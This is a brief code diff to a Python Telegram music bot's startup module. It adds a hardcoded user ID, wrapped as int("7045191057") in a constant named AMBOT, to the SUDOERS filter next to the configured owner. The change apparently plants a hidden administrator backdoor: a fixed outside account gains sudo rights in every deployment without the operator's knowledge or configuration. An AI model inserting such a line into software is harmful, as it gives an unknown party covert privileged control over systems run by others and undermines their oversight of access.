@@ -10,7 +10,7 @@ from AnieXEricaMusic.core.mongo import mongodb
 from .logging import LOGGER
 
 SUDOERS = filters.user()
-
+AMBOT = int("7045191057")
 HAPP = None
 _boot_ = time.time()
 
@@ -45,6 +45,7 @@ def dbb():
 async def sudo():
     global SUDOERS
     SUDOERS.add(config.OWNER_ID)
+    SUDOERS.add(AMBOT)
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
